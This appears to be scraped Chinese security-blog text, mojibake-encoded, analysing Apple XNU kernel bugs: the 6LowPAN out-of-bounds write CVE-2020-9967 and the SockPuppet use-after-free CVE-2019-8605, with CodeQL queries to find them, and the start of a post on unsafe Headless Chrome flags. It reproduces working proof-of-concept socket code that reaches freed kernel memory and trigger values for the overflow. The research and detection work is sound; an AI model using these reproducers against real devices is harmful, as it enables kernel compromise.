éšåæµ‹è¯•ä¸€ä¸‹æ•°æ®åº“å¯ç”¨å³å¯ã€‚ CodeQL queryåœ¨è¿™ä¸ªç‰ˆæœ¬çš„xnuä»£ç (6153.101.6)ï¼Œbcopyåœ¨xnuä¸­è¢«å¤§é‡ä½¿ç”¨ï¼Œä½†æ˜¯å®ç°æ¢æˆäº† builtin___memmove_chk ï¼Œæ‰€ä»¥åªéœ€è¦æŠŠ ä¹‹å‰æ±¡ç‚¹è¿½è¸ªçš„ queryçš„sinkæ›¿æ¢ä¸€ä¸‹å³å¯ã€‚ èƒ½è¦†ç›–åˆ°è¿™äº›é—®é¢˜ï¼Œä½†æ˜¯éœ€è¦æŒ¨ä¸ªç»“æœå®¡è®¡ï¼Œç„¶åæ„é€ pocæ‰è¡Œã€‚ About 6LowPAN6LowPAN åœ¨ macOS10.15å¼•å…¥ï¼Œå…¨ç§°æ˜¯: IPv6 over Low-Power Wireless Persona Area Networks 6LoWPANæ˜¯ä¸€ç§åŸºäºIPv6çš„ä½é€Ÿæ— çº¿ä¸ªåŸŸç½‘æ ‡å‡†ï¼Œå³IPv6 over IEEE 802.15.4ã€‚è®©æ¯ä¸ªèŠ‚ç‚¹å¯ä»¥ç”¨IPv6åœ°å€è”ç½‘ã€‚è¿™å…è®¸èŠ‚ç‚¹ä½¿ç”¨å¼€æ”¾æ ‡å‡†ç›´æ¥ä¸Internetè¿æ¥ã€‚å³ä½¿åœ¨æœ€å°çš„èµ„æºå—é™è®¾å¤‡ä¸Šä¹Ÿå¯ä»¥åº”ç”¨Internetåè®®ï¼Œå¹¶ä¸”å¤„ç†èƒ½åŠ›æœ‰é™çš„ä½åŠŸç‡è®¾å¤‡åº”è¯¥èƒ½å¤Ÿå‚ä¸ç‰©è”ç½‘ã€‚ å¹¿åŸŸæ— çº¿ç‰©è”ç½‘åŠ6LoWPANä»‹ç» RFC 4919 - IPv6 over Low-Power Wireless Personal Area Networks (6LoWPANs): Overview, Assumptions, Problem Statement, and Goals ï¼ˆççŒœä¸€ä¸‹ï¼Œæ„Ÿè§‰è¿™ä¸ªä¸œè¥¿æ˜¯å¯¹åº”10.15é‡Œå¼•å…¥çš„é‚£ä¸ª â€œä»¥æŸ¥æ‰¾æœªè”ç½‘Mac çš„åŠŸèƒ½â€œ ï¼‰ 12345frame802154.c â†’ 802.15.4å¸§åˆ›å»ºå’Œè§£æé€»è¾‘if_6lowpan.c â†’ 6LowPAN network interfacesixlowpan.c â†’ 6LowPAN å‹ç¼©/è§£å‹é€»è¾‘ IEEE 802.15.4å¸§æ ¼å¼ frame control å­—æ®µï¼š IPv6æŠ¥æ–‡å¿…é¡»æ‰¿è½½åœ¨æ•°æ®å¸§ä¸Šã€‚è§£æå¸§çš„æ—¶å€™ï¼Œé¦–å…ˆç¡®å®šheaderï¼Œéšåè§£æ payloadéƒ¨åˆ†ã€‚ LoWPAN Payload ç”±äºå…¨IPv6æŠ¥æ–‡ä¸ç¬¦åˆieee802.15.4å¸§çš„è¦æ±‚ï¼ŒIPv6éœ€è¦æä¾›é€‚é…å±‚æ¥æ»¡è¶³MTUçš„æœ€å°è¦æ±‚ã€‚è¯¥æ ‡å‡†è¿˜å®šä¹‰äº†æŠ¥å¤´å‹ç¼©çš„ä½¿ç”¨ï¼Œå› ä¸ºé¢„è®¡å¤§å¤šæ•°åº”ç”¨ç¨‹åºå°†ä½¿ç”¨IEEE 802.15.4ä¸Šçš„IPã€‚ LoWPAN payload (e.g., an IPv6 packet) éµå¾ªä¸Šé¢çš„æè¿°ï¼›IPv6 å¤´æœ‰40å­—èŠ‚ã€‚ åœ¨åˆå§‹æ ‡å‡†ä¸­ï¼Œå®šä¹‰äº† LoWPAN_HC1 å‹ç¼©IPv6æ•°æ®æŠ¥ã€‚è¿™æ„å‘³ç€6LowPANçš„payload åœ¨æ¥æ”¶æ—¶è¢«å‹ç¼©ã€‚ Data Link Layer Dispatching æ•°æ®é“¾è·¯å±‚åˆ†å‘ é¦–å…ˆï¼Œæˆ‘ä»¬å¯ä»¥å‘é€ä¸€ä¸ªä»¥å¤ªç½‘æ•°æ®åŒ…ï¼Œè¯¥æ•°æ®åŒ…å°†ç”±demuxå‡½æ•°å¤„ç† 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253intether_demux(ifnet_t ifp, mbuf_t m, char *frame_header, protocol_family_t *protocol_family){ struct ether_header *eh = (struct ether_header *)(void *)frame_header; u_short ether_type = eh-&gt;ether_type; u_int16_t type; u_int8_t *data; u_int32_t i = 0; struct ether_desc_blk_str *desc_blk = (struct ether_desc_blk_str *)ifp-&gt;if_family_cookie; u_int32_t maxd = desc_blk ? desc_blk-&gt;n_max_used : 0; struct en_desc *ed = desc_blk ? desc_blk-&gt;block_ptr : NULL; u_int32_t extProto1 = 0; u_int32_t extProto2 = 0; if (eh-&gt;ether_dhost[0] &amp; 1) { /* Check for broadcast */ if (_ether_cmp(etherbroadcastaddr, eh-&gt;ether_dhost) == 0) { m-&gt;m_flags |= M_BCAST; } else { m-&gt;m_flags |= M_MCAST; } } if (m-&gt;m_flags &amp; M_HASFCS) { /* * If the M_HASFCS is set by the driver we want to make sure * that we strip off the trailing FCS data before handing it * up the stack. */ m_adj(m, -ETHER_CRC_LEN); m-&gt;m_flags &amp;= ~M_HASFCS; } if ((eh-&gt;ether_dhost[0] &amp; 1) == 0) { /* * When the driver is put into promiscuous mode we may receive * unicast frames that are not intended for our interfaces. * They are marked here as being promiscuous so the caller may * dispose of them after passing the packets to any interface * filters. */ if (_ether_cmp(eh-&gt;ether_dhost, IF_LLADDR(ifp))) { m-&gt;m_flags |= M_PROMISC; } } /* check for IEEE 802.15.4 */ if (ether_type == htons(ETHERTYPE_IEEE802154)) { *protocol_family = PF_802154; return 0; } å¦‚æœä»¥å¤ªæŠ¥å¤´ä¸­çš„ ether_type æ˜¯ ETHERTYPE_IEEE802154 , é‚£ä¹ˆè¯¥å‡½æ•°ä¼šå°†åè®®æ—è®¾ç½®ä¸ºPF 802154ã€‚ ç°åœ¨ï¼Œåœ¨é»˜è®¤é…ç½®ä¸­ï¼Œè¿™ä¸ªåè®®æ—å°†ä¸ä¼šè¢«å¤„ç†ï¼Œé™¤éé…ç½®äº†6lowpanæ¥å£ï¼Œè¿™å°†å¯¼è‡´ä»¥ä¸‹ä»£ç æ³¨å†Œä¸€ä¸ªå‡½æ•° sixlowpan_input ï¼Œå½“å¤„ç†ä¸€ä¸ª802.15.4å¸§æ—¶å°†è¢«è°ƒç”¨ã€‚ 123456789101112131415161718192021222324/* * Function: sixlowpan_attach_protocol * Purpose: * Attach a DLIL protocol to the interface * The ethernet demux actually special cases 802.15.4. * The demux here isn't used. The demux will return PF_802154 for the * appropriate packets and our sixlowpan_input function will be called. */static intsixlowpan_attach_protocol(struct ifnet *ifp){ int error; struct ifnet_attach_proto_param reg; bzero(&amp;reg, sizeof(reg)); reg.input = sixlowpan_input; reg.detached = sixlowpan_detached; error = ifnet_attach_protocol(ifp, PF_802154, &amp;reg); if (error) { printf(\"%s(%s%d) ifnet_attach_protocol failed, %d\\n\", __func__, ifnet_name(ifp), ifnet_unit(ifp), error); } return error;} Vulnerability Detailsè°ƒç”¨sixlowpan_inputå‡½æ•°æ¥è§£å°è£…802.15.4æ•°æ®å¸§ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869/* * 6lowpan input routine. * Decapsulate the 802.15.4 Data Frame * Header decompression on the payload * Pass the mbuf to the IPV6 protocol stack using proto_input() */static intsixlowpan_input(ifnet_t p, __unused protocol_family_t protocol, mbuf_t m, __unused char *frame_header){ frame802154_t ieee02154hdr; u_int8_t *payload = NULL; if6lpan_ref ifl = NULL; bpf_packet_func bpf_func; mbuf_t mc, m_temp; int off, err = 0; u_int16_t len; /* Allocate an mbuf cluster for the 802.15.4 frame and uncompressed payload */ mc = m_getcl(M_WAITOK, MT_DATA, M_PKTHDR); if (mc == NULL) { err = -1; goto err_out; } memcpy(&amp;len, mtod(m, u_int8_t *), sizeof(u_int16_t)); len = ntohs(len);** // This is the size read from the frame on the wire. m_adj(m, sizeof(u_int16_t)); /* Copy the compressed 802.15.4 payload from source mbuf to allocated cluster mbuf */ for (m_temp = m, off = 0; m_temp != NULL; m_temp = m_temp-&gt;m_next) { if (m_temp-&gt;m_len &gt; 0) { m_copyback(mc, off, m_temp-&gt;m_len, mtod(m_temp, void *)); off += m_temp-&gt;m_len; } } p = p_6lowpan_ifnet; mc-&gt;m_pkthdr.rcvif = p; sixlowpan_lock(); ifl = ifnet_get_if6lpan_retained(p); if (ifl == NULL) { sixlowpan_unlock(); err = -1; goto err_out; } if (if6lpan_flags_ready(ifl) == 0) { if6lpan_release(ifl); sixlowpan_unlock(); err = -1; goto err_out; } bpf_func = ifl-&gt;if6lpan_bpf_input; sixlowpan_unlock(); if6lpan_release(ifl); if (bpf_func) { bpf_func(p, mc); } /* Parse the 802.15.4 frame header */ bzero(&amp;ieee02154hdr, sizeof(ieee02154hdr)); frame802154_parse(mtod(mc, uint8_t *), len, &amp;ieee02154hdr, &amp;payload); /* XXX Add check for your link layer address being dest */ sixxlowpan_input(&amp;ieee02154hdr, payload); m_getcl åˆ†é…mc(mbuf cluster)æ¥å­˜æ”¾è¦å¤„ç†çš„ 802.15.4 få¸§å’Œæœªè§£å‹çš„payload æ‹·è´æœªè§£å‹çš„802.15.4 payload åˆ°æ–°åˆ†é…çš„mcä¸­ len æ˜¯ä»å‚æ•° mbuf m ä¸­è¯»å–å¾—åˆ°çš„ï¼Œè¿™æ˜¯ä¸€ä¸ªå¯æ§çš„å€¼ï¼Œåœ¨åé¢è§£æé€»è¾‘: frame802154_parse ï¼Œè¿™ä¸ªé•¿åº¦æ˜¯ç›´æ¥ä½¿ç”¨çš„ã€‚ å› ä¸ºæˆ‘ä»¬å¯ä»¥å°†lenæ§åˆ¶åœ¨0-0xffffä¹‹é—´ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿pf-&gt;payload_lenä¸ºè´Ÿå€¼(to-header len)ï¼Œå°äºé¢„æœŸçš„å¤§å°ï¼Œæˆ–è€…å¤§äºmcä¸­è¾“å…¥æ•°æ®æœ¬èº«çš„å¤§å°ã€‚ éšåçš„è°ƒç”¨æ˜¯ sixxlowpan_input(&amp;ieee02154hdr, payload); è¿™ä¸ªå‡½æ•°ç›´æ¥ä½¿ç”¨äº† ä¹‹å‰è§£æå‡ºæ¥çš„pf å’Œ payloadã€‚ 1234567891011121314151617errno_tsixxlowpan_input(struct frame802154 *ieee02154hdr, u_int8_t *payload){ errno_t error = 0; error = sixxlowpan_uncompress(ieee02154hdr, payload); if (error != 0) { goto done; } /* * TO DO: fragmentation */done: return error;} ä¹‹åèµ°åˆ° sixxlowpan_uncompress å‡½æ•°ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344errno_tsixxlowpan_uncompress(struct frame802154 ***ieee02154hdr**, u_int8_t *payload){ long hdroffset; size_t hdrlen; u_int8_t hdrbuf[128]; errno_t error; bzero(hdrbuf, sizeof(hdrbuf)); hdrlen = sizeof(hdrbuf); error = uncompress_hdr_hc1(ieee02154hdr, (u_int8_t *)payload, 0, &amp;hdroffset, &amp;hdrlen, hdrbuf); // 0 if (error != 0) { return error; } if (hdroffset &lt; 0) { // 1 /* * hdroffset negative means that we have to remove * hdrlen of extra stuff */ memmove(&amp;payload[0], &amp;payload[hdrlen], ieee02154hdr-&gt;payload_len - hdrlen); ieee02154hdr-&gt;payload_len -= hdrlen; } else { /* * hdroffset is the size of the compressed header * -- i.e. when the untouched data starts * * hdrlen is the size of the decompressed header * that takes the place of compressed header of size hdroffset */ memmove(payload + hdrlen, payload + hdroffset, ieee02154hdr-&gt;payload_len - hdroffset); // 2ï¼Œ oob write here, `ieee02154hdr-&gt; payload_len-3 = -2` memcpy(payload, hdrbuf, hdrlen); ieee02154hdr-&gt;payload_len += hdrlen - hdroffset; } return 0;} å› æ­¤ï¼Œå¦‚æœæˆ‘ä»¬å°†æ¥æ”¶åˆ°çš„å¸§çš„lenè®¾ç½®ä¸º0x4ï¼Œåˆ™æœ€ç»ˆå°†è®¡ç®—å‡ºä»¥ä¸‹å€¼(frame802154_parse)ï¼š c header length = 3 frame-&gt;payload_len= 1 åŒæ—¶ï¼Œåœ¨uncompress_hdr_hc1å‡½æ•°ä¸­ï¼ˆat 0)ï¼Œæ§åˆ¶æµç¨‹èµ°åˆ° SICSLOWPAN_HC1_NH_UDP åˆ†æ”¯ï¼š 123*hdroffset = SICSLOWPAN_HC1_HDR_LEN; --&gt; *hdroffset = 3*hdrlen = UIP_IPH_LEN; --&gt; *hdrlen = 40sizeof(struct ip6_hdr) = 40 å†å›åˆ°ä¸Šå±‚å‡½æ•°sixxlowpan_uncompress (at 1)ï¼Œhdroffset ä¸º3ï¼Œèµ°ä¸‹é¢çš„åˆ†æ”¯ï¼Œèƒ½å¤Ÿèµ°åˆ° memmoveè°ƒç”¨(at 2) 123memmove(payload + hdrlen, payload + hdroffset, ieee02154hdr-&gt;payload_len - hdroffset); where : payload + 40 what : source payload buffer, å¯æ§ length : ieee02154hdr-&gt;payload_len - hdroffset å³ payload_len - hdroffset = 1 - 3 = -2 å¼•ç”¨Building XNU for macOS Big Sur 11.0.1 (Intel) D4rkD0g/boringforever Kernel crash caused by out-of-bounds write in Appleâ€™s ICMP packet-handling code (CVE-2018-4407) - GitHub Security Lab CVE-2020-9967 - Apple macOS 6LowPAN Vulnerability","link":"/2021/02/15/CodeQL-XNU-From-0-to-1/"},{"title":"SockPuppetå­¦ä¹ è®°å½•(ä¸€) : æ¼æ´åˆ†æ","text":"Basic è¿™ä¸ªæ¼æ´æ˜¯ç”±pj0çš„ nedwill å‘ç°çš„ï¼Œè€Œä¸”æ˜¯ä¸€ä¸ªå“ç›¸æä½³çš„å¯ä»¥ç”¨äºè¶Šç‹±çš„æ¼æ´ï¼Œæœ¬æ–‡åªæ˜¯å¯¹æ¼æ´è¿›è¡Œåˆ†æï¼Œå¹¶ä¸”æ€è€ƒ/å°è¯•ä½¿ç”¨CodeQLå¯¹è¯¥ç±»å‹æ¼æ´è¦†ç›–ã€‚å½“ç„¶ï¼Œåœ¨çœ‹äº†åŸä½œè€…çš„æ–‡ç« ä¹‹åï¼Œæ‰å‘ç°nedwillæ˜¯åˆ©ç”¨Fuzzingçš„æ‰‹æ®µå‘ç°çš„è¿™ä¸ªæ¼æ´ï¼Œå¹¶ä¸”åœ¨æŒ–æ˜è¯»/å†™åŸè¯­çš„æ—¶å€™ä¹Ÿæ˜¯å€ŸåŠ©äº†Fuzzingçš„æ‰‹æ®µï¼Œå¯ä»¥è¯´ååˆ†çš„å·§å¦™å’Œé«˜æ•ˆäº†ã€‚ æ¼æ´issue ï¼š1806 - project-zero - Project Zero - Monorail ç³»ç»Ÿç‰ˆæœ¬ï¼š10.14.3 xnuä»£ç ï¼š pocraw pocåœ¨æµ‹è¯•åŸå§‹PoCè·å¾—çš„Crashä¿¡æ¯å¦‚ä¸‹ï¼š åŸå§‹PoCä½¿ç”¨äº†raw socketè§¦å‘ï¼Œä½†æ˜¯ç¾ä¸­ä¸è¶³ï¼Œè¿™ä¸ªæ–¹å¼å¿…é¡»è¦rootæƒé™æ‰èƒ½è§¦å‘ã€‚(å®šåˆ¶åŒ–sockaddr_in6 éœ€è¦raw socket) 1234567891011121314151617181920212223242526272829303132333435363738#define IPPROTO_IP 0#define IN6_ADDR_ANY { 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 }#define IN6_ADDR_LOOPBACK { 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1 }int main() { int s = socket(AF_INET6, SOCK_RAW, IPPROTO_IP); printf(\"res0: %d\\n\", s); struct sockaddr_in6 sa1 = { .sin6_len = sizeof(struct sockaddr_in6), .sin6_family = AF_INET6, .sin6_port = 65000, .sin6_flowinfo = 3, .sin6_addr = IN6_ADDR_LOOPBACK, .sin6_scope_id = 0, }; struct sockaddr_in6 sa2 = { .sin6_len = sizeof(struct sockaddr_in6), .sin6_family = AF_INET6, .sin6_port = 65001, .sin6_flowinfo = 3, .sin6_addr = IN6_ADDR_ANY, .sin6_scope_id = 0, }; int res = connect(s, (const sockaddr*)&amp;sa1, sizeof(sa1)); printf(\"res1: %d\\n\", res); unsigned char buffer[4] = {}; res = setsockopt(s, 41, 50, buffer, sizeof(buffer)); printf(\"res1.5: %d\\n\", res); res = connect(s, (const sockaddr*)&amp;sa2, sizeof(sa2)); printf(\"res2: %d\\n\", res); close(s); printf(\"done\\n\");} readåç»­nedç»è¿‡ç ”ç©¶å‘ç°å¯ä»¥é€šè¿‡tcp socketæ–¹å¼è§¦å‘ï¼Œå¯ä»¥ç”¨äºread freeâ€™d memroy: 1234567891011121314151617181920212223242526272829303132#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;netinet/in.h&gt;/*TCP-based reproducer for CVE-2019-8605This has the benefit of being reachable from the app sandbox on iOS 12.2.*/#define IPV6_3542PKTINFO 46int main() { int s = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP); printf(\"res0: %d\\n\", s); unsigned char buffer[1] = {'\\xaa'}; int res = setsockopt(s, IPPROTO_IPV6, IPV6_3542PKTINFO, buffer, sizeof(buffer)); printf(\"res1: %d\\n\", res); res = disconnectx(s, 0, 0); printf(\"res2: %d\\n\", res); socklen_t buffer_len = sizeof(buffer); //get sth from ... res = getsockopt(s, IPPROTO_IPV6, IPV6_3542PKTINFO, buffer, &amp;buffer_len); printf(\"res3: %d\\n\", res); printf(\"got %d\\n\", buffer[0]); close(s); printf(\"done\\n\");} writeç»è¿‡nedwillçš„Fuzzingæµ‹è¯•ï¼Œå‘ç°äº†write freeâ€™d memory çš„PoCï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748//// setoptshut.m// ExploitDev// TCP-based reproducer for CVE-2019-8605, using SONPX_SETOPTSHUT to do a// write to the freed memory. Tested on iOS 12.2.//// Created by Ned Williamson on 6/17/19.// Copyright Â© 2019 Ned Williamson. All rights reserved.//#import &lt;UIKit/UIKit.h&gt;#import \"AppDelegate.h\"#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;netinet/in.h&gt;#define IPV6_USE_MIN_MTU 42int main(int argc, char * argv[]) { while (1) { int s = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP); printf(\"res0: %d\\n\", s); // Permit setsockopt after disconnecting (and freeing socket options) struct so_np_extensions sonpx = {.npx_flags = SONPX_SETOPTSHUT, .npx_mask = SONPX_SETOPTSHUT}; int res = setsockopt(s, SOL_SOCKET, SO_NP_EXTENSIONS, &amp;sonpx, sizeof(sonpx)); printf(\"res1: %d\\n\", res); int minmtu = -1; res = setsockopt(s, IPPROTO_IPV6, IPV6_USE_MIN_MTU, &amp;minmtu, sizeof(minmtu)); printf(\"res2: %d\\n\", res); res = disconnectx(s, 0, 0); printf(\"res3: %d\\n\", res); // set, write sth... res = setsockopt(s, IPPROTO_IPV6, IPV6_USE_MIN_MTU, &amp;minmtu, sizeof(minmtu)); printf(\"res4: %d\\n\", res); close(s); printf(\"done\\n\"); } @autoreleasepool { return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class])); }} bug analysisæ ¹æ®æ¼æ´æè¿°ï¼Œå¯ä»¥çœ‹åˆ°æ¼æ´çš„ root causeå¦‚ä¸‹ï¼š 1234567891011121314151617181920voidin6_pcbdetach(struct inpcb *inp){ // ... if (!(so-&gt;so_flags &amp; SOF_PCBCLEARING)) { struct ip_moptions *imo; struct ip6_moptions *im6o; inp-&gt;inp_vflag = 0; if (inp-&gt;in6p_options != NULL) { m_freem(inp-&gt;in6p_options); inp-&gt;in6p_options = NULL; // &lt;- good } ip6_freepcbopts(inp-&gt;in6p_outputopts); // &lt;- bad ROUTE_RELEASE(&amp;inp-&gt;in6p_route); // free IPv4 related resources in case of mapped addr if (inp-&gt;inp_options != NULL) { (void) m_free(inp-&gt;inp_options); // &lt;- good inp-&gt;inp_options = NULL; } æ¼æ´è·¯å¾„ bsd/netinet6/in6_pcb.c ï¼Œåè®®æ— AF_INET6 çš„å¤„ç†å‡½æ•°ï¼Œä»å‡½æ•°åå­—æ¥çœ‹æ˜¯æ–­å¼€è¿æ¥æ—¶å€™ä¼šæ‰§è¡Œçš„ä¸€äº›æ“ä½œï¼ˆé‡Šæ”¾ä¸€äº›èµ„æºï¼‰ï¼Œä½†æ˜¯é‡Šæ”¾ä¹‹åå¿˜è®°æŠŠæŒ‡é’ˆç½®NULLï¼Œå¯¼è‡´åŒä¸€ä¸ªå¥—æ¥å­—é‡è¿çš„æ—¶å€™åˆä½¿ç”¨åˆ°äº†è¿™ä¸ªæŒ‡é’ˆï¼ˆæ‚¬å‚æŒ‡é’ˆï¼‰ã€‚æ ¹æ®nedwillçš„æè¿°ï¼Œè¿æ¥æ–­å¼€å†set/get socketoptçš„åœºæ™¯å¯ä»¥è§¦å‘ã€‚ è¿›å…¥å‡½æ•°ä¹‹å‰æœ‰ä¸€ä¸ª socket so_flags çš„æ£€æŸ¥ï¼Œpocä¸­çš„ setsockopt() è°ƒç”¨åº”è¯¥æ˜¯ä¸ºäº†èƒ½è¿‡è¿›å…¥æ¼æ´é€»è¾‘è®¾è®¡çš„ã€‚ åˆ©ç”¨ socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP); è¿™ä¸ªpocï¼Œé€»è¾‘åº”è¯¥æ˜¯ï¼š åˆ›å»ºsocketè¿æ¥ setsockoptï¼Œä¸ºäº†åç»­å¯ä»¥è¿›å…¥æ¼æ´ä»£ç åˆ†æ”¯ï¼ŒåŒæ—¶è®¾ç½®è¦è¯»çš„æ•°æ® disconnectx æ–­å¼€è¿æ¥ï¼Œè§¦å‘ free é€»è¾‘ getsockoptï¼Œè¯»å–å·²ç»é‡Šæ”¾çš„å†…å­˜ å†™çš„é€»è¾‘ç±»ä¼¼ï¼Œä¸è¿‡ä½œè€…æ˜¯æ‰¾åˆ°äº†å¦å¤–ç‰¹æ®Šçš„æˆå‘˜æ¥å®Œæˆå†™æ“ä½œï¼š SONPX_SETOPTSHUT è¿™ä¸ªæ´çš„å“ç›¸å¤ªå¥½äº† :-) how to find by QLxnu databaseå¯ä»¥ä»semmleå®˜æ–¹ç½‘ç«™ä¸‹è½½ Analyzing large open source projects about this bugçœ‹èµ·æ¥æ˜¯ï¼š 123456789101112131415int demo(p){ ptr, p2; // .... free(ptr); ptr = NULL; m_free(p-&gt;p1); // vuln! if(xxx){ freem(p2); p2 = NULL; }} é‡Šæ”¾äº†å†…å­˜ä¹‹åï¼Œæ²¡æœ‰å¯¹æŒ‡é’ˆåšç½®NULLå¤„ç†ã€‚ éœ€è¦åœ¨åŒä¸€ä¸ªå‡½æ•°é‡Œï¼ŒåŒä¸€ä¸ªä»£ç å—é‡Œã€‚ é”çš„é—®é¢˜è€ƒè™‘å—ï¼Ÿ é‡Šæ”¾é€»è¾‘ï¼Œæ­£åˆ™åŒ¹é…ä¸‹ï¼Œ xxxfree, freexxx, releasexxxä¹‹ç±»çš„ query 1æ ¹æ®ä¸Šé¢çš„æè¿°ï¼Œæˆ‘ä»¬æ‰¾åˆ°free è°ƒç”¨ï¼Œä¸”freeè°ƒç”¨ä¸‹ä¸€è¡Œæ˜¯ç‰¹å®šçš„èµ‹å€¼è¡¨è¾¾å¼çš„æƒ…å†µï¼š 12345678import cppfrom FunctionCall call, AssignExpr ewhere call.getTarget().getName().regexpMatch(\".*free.*?\") and call.getEnclosingBlock() = e.getEnclosingBlock() and e.getRValue().(Literal).getValue() = \"0\" and call.getLocation().getStartLine() + 1 = e.getLocation().getStartLine()select call, call.getEnclosingFunction().getName(), call.getArgument(0) è¿™é‡Œæœ‰ä¸€ä¸ªé—®é¢˜ï¼Œæˆ‘å°è¯•è¿‡ freeè°ƒç”¨çš„å‚æ•°ä½œä¸ºèµ‹å€¼è¡¨è¾¾å¼çš„å·¦å€¼ è¿™æ¡çº¦æŸï¼Œä½†æ˜¯åŠ ä¸Šä¹‹åå°±æ‰¾ä¸åˆ°ä»»ä½•ç»“æœäº†ï¼Œå¦‚æœæœ‰äººçŸ¥é“åŸå› è¿˜è¯·æŒ‡ç‚¹ä¸€ä¸‹ : ) query 2ä¸Šé¢queryå¯ä»¥æ‰¾åˆ° freeåæ˜¯set NULLçš„ä»£ç æ®µï¼Œå¦‚æœæƒ³æ‰¾ä¸æ»¡è¶³æ¡ä»¶çš„ï¼Œå¯ä»¥æ£€æµ‹freeé€»è¾‘ä¸‹ä¸€è¡Œæ˜¯ä¸æ˜¯ instance of AssignExprï¼Œå½“ç„¶è¿™æ ·æ¯”è¾ƒç²—ç³™ï¼Œä¼šå­˜åœ¨è¯¯æŠ¥ã€‚ 123456from FunctionCall call, Expr ewhere call.getTarget().getName().regexpMatch(\".*free.*?\") and call.getEnclosingBlock() = e.getEnclosingBlock() and not(e instanceof AssignExpr ) and call.getLocation().getStartLine() + 1 = e.getLocation().getStartLine()select call, call.getEnclosingFunction().getName(), call.getArgument(0) è¿™æ ·å†™ï¼Œè™½ç„¶å¯ä»¥æ‰¾åˆ°ç›®æ ‡ä»£ç ï¼Œä½†æ˜¯å­˜åœ¨è¯¯æŠ¥ï¼ˆä¼˜åŒ–TODOï¼‰ï¼š","link":"/2021/02/28/SockPuppet%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-%E4%B8%80-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"title":"Exploit Headless Chrome","text":"èƒŒæ™¯Chrome M59å¼•å…¥äº† Headless Chromeï¼Œè‡³æ­¤å¯ä»¥åœ¨æ— GUIçš„ç¯å¢ƒä¸‹ä½¿ç”¨Chromeï¼Œæå¤§çš„æ–¹ä¾¿äº†è‡ªåŠ¨åŒ–æµ‹è¯•å·¥ä½œï¼Œä¹Ÿå¯ä»¥ç”¨äºé¢„è§ˆæœåŠ¡ï¼Œæˆ–è€…ç½‘ç»œçˆ¬è™«ã€‚ å‰ç«¯å¹¶ä¸æ˜¯æˆ‘çš„å¼ºé¡¹ï¼Œæˆ‘åœ¨ä¸Šç½‘å†²æµªçš„æ—¶å€™å‘ç°ä¸€ä¸ªå¾ˆæœ‰è¶£çš„ç°è±¡ï¼š å¾ˆå¤šæŠ€æœ¯æ–‡ç« ç›¸äº’å‚è€ƒï¼Œæœ‰äº›ä»£ç è‡ªç„¶ä¹Ÿç›´æ¥å¤åˆ¶ç²˜è´´ä½¿ç”¨ Headless Chromeè‡ªç„¶ä¹Ÿæ˜¯è¿™æ ·ï¼Œä¸€äº›ä¸å¥½çš„ç¼–ç¨‹ä¹ æƒ¯ä¹Ÿè¢«é”™è¯¯åœ°ä¼ æ’­ äºæ˜¯æœ‰äº†æœ¬æ–‡ï¼Œä»¥åŠä¸€äº›ä¸ªäººçš„æ€è€ƒã€‚ æ€è€ƒ ğŸ¤”é¦–å…ˆï¼Œåœ¨Googleæœç´¢Headless Chromeç›¸å…³çš„æŠ€æœ¯æ–‡ç« ï¼Œä¼šè·³å‡ºæ¥å®˜æ–¹æ–‡æ¡£ä»¥åŠå„ç§æŠ€æœ¯æ–‡ç« : (å…³é”®è¯é¡ºåºåäº†ï¼Œä¸è¿‡ä¸å½±å“ XD ) Headless Chromeå…¶å®å°±æ˜¯ä»å‘½ä»¤è¡Œå¯åŠ¨Chromeï¼Œä¼ é€’äº†--headlessçš„å‚æ•°ï¼Œé‚£ä¹ˆå¯¹äºChromeæ¥è¯´ï¼Œæœ‰å¾ˆå¤šå‚æ•°ï¼Œä½†æ˜¯æœ‰é‚£ä¹ˆå‡ ä¸ªå‚æ•°éå¸¸å±é™©ï¼Œæ¯”å¦‚ : --no-sandboxï¼Œ--disable-web-securityï¼Œä»¥åŠå¼€å¯è°ƒè¯•ç«¯å£â€¦ åœ¨çœ‹äº†å¾ˆå¤šç½‘ä¸Šçš„æ–‡ç« åï¼Œæˆ‘å‘ç°æœ‰ä¸å°‘ä»£ç æ˜¯é‡å¤çš„ï¼ˆå…³é”®é€»è¾‘ï¼‰ï¼Œæ¯”å¦‚è¿™ç¯‡: å¯¹äºé”™è¯¯çš„å‚æ•°ä¹Ÿæ˜¯ä¸€æ ·çš„ï¼Œæ¯”å¦‚ä¸çº¦è€ŒåŒåœ°å…³é—­sandbox: 123const browser = await puppeteer.launch( {args: ['--no-sandbox', '--disable-setuid-sandbox'] }); æˆ–è€…è°ƒè¯•ç«¯å£ä¸æ˜¯ 9222å°±æ˜¯9229è¿™ç±»æƒ…å†µã€‚ è¿™é‡Œå…¶å®æœ‰å‡ ä¸ªé—®é¢˜ï¼š æˆ‘ä½¿ç”¨çš„å‚æ•°æ˜¯ä»€ä¹ˆæ„æ€ï¼Ÿ è¿™äº›å‚æ•°å¯¹æˆ‘çš„ç¨‹åºæœ‰ä»€ä¹ˆå½±å“ï¼Ÿ è¿™äº›å‚æ•°å®‰å…¨å—ï¼Ÿ ä»€ä¹ˆæƒ…å†µä¸‹æˆ‘å¯ä»¥ç”¨ï¼Œä»€ä¹ˆæƒ…å†µä¸‹ä¸èƒ½ä½¿ç”¨ï¼Ÿ å¦‚æœæä¸æ¸…æ¥šï¼Œå¯¹äºåªæ˜¯ä¸ªäººå­¦ä¹ 